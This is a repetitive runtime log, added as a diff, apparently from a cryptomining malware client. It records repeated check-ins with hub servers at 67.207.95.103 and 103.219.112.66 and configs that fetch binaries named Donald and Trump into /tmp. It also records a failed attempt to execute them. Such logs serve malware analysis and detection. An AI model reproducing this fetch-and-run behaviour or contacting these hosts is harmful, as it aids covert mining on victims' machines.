+I0615 12:39:41.772526   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:41.774874   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:41.777006   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:41.779448   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:41.782485   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:51.703266   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:39:51.703346   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:39:51.703395   17737 report.go:46] empty baselist
+I0615 12:39:51.935654   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:39:51.935767   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:51.938567   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:51.940614   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:51.942565   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:51.944306   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:39:51.946365   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:01.698956   17737 report.go:46] empty baselist
+I0615 12:40:01.734887   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:40:01.735259   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:01.738021   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:01.740206   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:01.742258   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:01.744390   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:01.746585   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:11.694001   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:40:11.694079   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:40:11.694115   17737 report.go:46] empty baselist
+I0615 12:40:11.925570   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:40:11.926388   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:11.932117   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:11.934791   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:11.940744   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:11.943697   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:11.951291   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:21.695051   17737 report.go:46] empty baselist
+I0615 12:40:21.727631   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:40:21.734071   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:21.736396   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:21.738204   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:21.742669   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:21.745206   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:21.747551   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:31.693581   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:40:31.693647   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:40:31.693676   17737 report.go:46] empty baselist
+I0615 12:40:31.926764   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:40:31.927737   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:31.931250   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:31.934187   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:31.936969   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:31.944400   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:31.951774   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:41.695441   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:40:41.695522   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:40:41.695561   17737 report.go:46] empty baselist
+I0615 12:40:41.926030   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:40:41.926529   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:41.929764   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:41.931190   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:41.932553   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:41.933890   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:41.935180   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:51.694388   17737 report.go:46] empty baselist
+I0615 12:40:51.731414   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:40:51.731498   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:51.733265   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:51.734773   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:51.736700   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:51.738261   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:40:51.739753   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:01.693280   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:41:01.693383   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:41:01.693425   17737 report.go:46] empty baselist
+I0615 12:41:01.925061   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:41:01.925137   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:01.927702   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:01.929150   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:01.930495   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:01.931900   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:01.933206   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:11.706952   17737 report.go:46] empty baselist
+I0615 12:41:11.744948   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:41:11.745294   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:11.760295   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:11.762569   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:11.764772   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:11.766949   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:11.768905   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:11.838106   17737 miner.go:93] pid not exists {{/tmp/Donald /static/Donald 0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:41:11.845850   17737 miner.go:93] pid not exists {{/tmp/Trump /static/Trump ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:41:11.903479   17737 miner.go:101] fork/exec /tmp/Donald: exec format error: {XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}}
+I0615 12:41:11.953890   17737 miner.go:101] fork/exec /tmp/Trump: exec format error: {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}
+I0615 12:41:21.693923   17737 report.go:46] empty baselist
+I0615 12:41:21.731154   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:41:21.731545   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:21.734201   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:21.736412   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:21.739101   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:21.741153   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:21.743323   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:31.693458   17737 report.go:46] empty baselist
+I0615 12:41:31.728975   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:41:31.729682   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:31.732492   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:31.734366   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:31.736359   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:31.738108   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:31.740278   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:41.698654   17737 report.go:46] empty baselist
+I0615 12:41:41.735098   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:41:41.735427   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:41.743174   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:41.746306   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:41.748378   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:41.750994   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:41.752947   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:51.693182   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:41:51.693267   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:41:51.693305   17737 report.go:46] empty baselist
+I0615 12:41:51.930300   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:41:51.930384   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:51.933439   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:51.936402   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:51.939146   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:51.945877   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:41:51.947956   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:01.693179   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:42:01.693273   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:42:01.693312   17737 report.go:46] empty baselist
+I0615 12:42:01.924266   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:42:01.924344   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:01.927699   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:01.931157   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:01.933956   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:01.936683   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:01.938978   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:11.693444   17737 report.go:46] empty baselist
+I0615 12:42:11.727965   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:42:11.728352   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:11.730867   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:11.732740   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:11.734706   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:11.736700   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:11.738886   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:21.693420   17737 report.go:46] empty baselist
+I0615 12:42:21.731720   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:42:21.732060   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:21.734469   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:21.736471   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:21.738251   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:21.740195   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:21.742708   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:31.693274   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:42:31.693367   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:42:31.693409   17737 report.go:46] empty baselist
+I0615 12:42:31.923765   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:42:31.923840   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:31.927035   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:31.928874   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:31.930632   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:31.932479   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:31.936751   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:41.693200   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:42:41.693266   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:42:41.693302   17737 report.go:46] empty baselist
+I0615 12:42:41.925386   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:42:41.925461   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:41.928494   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:41.930840   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:41.932823   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:41.934839   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:41.937599   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:51.693423   17737 report.go:46] empty baselist
+I0615 12:42:51.774950   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:42:51.775747   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:51.781560   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:51.783384   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:51.785391   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:51.787958   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:42:51.791340   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:01.693285   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:43:01.693376   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:43:01.693417   17737 report.go:46] empty baselist
+I0615 12:43:02.146956   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:43:02.147913   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:02.156615   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:02.159073   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:02.163651   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:02.167423   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:02.175122   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:11.693267   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:43:11.693353   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:43:11.693393   17737 report.go:46] empty baselist
+I0615 12:43:11.921084   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:43:11.922101   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:11.925607   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:11.928435   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:11.931068   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:11.937920   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:11.946398   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:21.693306   17737 report.go:46] empty baselist
+I0615 12:43:21.732756   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:43:21.733486   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:21.737966   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:21.740059   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:21.742919   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:21.744998   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:21.747412   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:31.693469   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:43:31.693553   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:43:31.693593   17737 report.go:46] empty baselist
+I0615 12:43:31.922213   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:43:31.922288   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:31.924547   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:31.926296   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:31.927987   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:31.929699   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:31.931244   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:41.693875   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:43:41.693938   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:43:41.693964   17737 report.go:46] empty baselist
+I0615 12:43:41.923093   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:43:41.923167   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:41.927423   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:41.929558   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:41.932075   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:41.934986   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:41.937099   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:51.693177   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:43:51.693270   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:43:51.693310   17737 report.go:46] empty baselist
+I0615 12:43:51.926538   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:43:51.926624   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:51.929092   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:51.931220   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:51.933176   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:51.935097   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:43:51.940008   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:01.693319   17737 main.go:110] try hub: 67.207.95.103:8000
+I0615 12:44:01.693413   17737 main.go:33] pingpong: 67.207.95.103:8000
+I0615 12:44:01.693453   17737 report.go:46] empty baselist
+I0615 12:44:01.924204   17737 miner.go:108] new config: [{XRun:{Exe:/tmp/Donald Url:/static/Donald Md5:0f8c0d79ad9f258f8aa56c38968a18f0}} {XRun:{Exe:/tmp/Trump Url:/static/Trump Md5:ed3ddd57d2486b11e52a8ae4c8be8ace}}]
+I0615 12:44:01.926195   17737 base.go:79] Cmd(1) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:01.929846   17737 base.go:79] Cmd(854) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:01.938688   17737 base.go:79] Cmd(850) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:01.942862   17737 base.go:79] Cmd(868) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:01.944996   17737 base.go:79] Cmd(818) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:01.947005   17737 base.go:79] Cmd(875) has processed at 2019-06-15 12:36:32 +0800 CST
+I0615 12:44:11.695790   17737 main.go:110] try hub: 103.219.112.66:8000
+I0615 12:44:11.695875   17737 main.go:33] pingpong: 103.219.112.66:8000
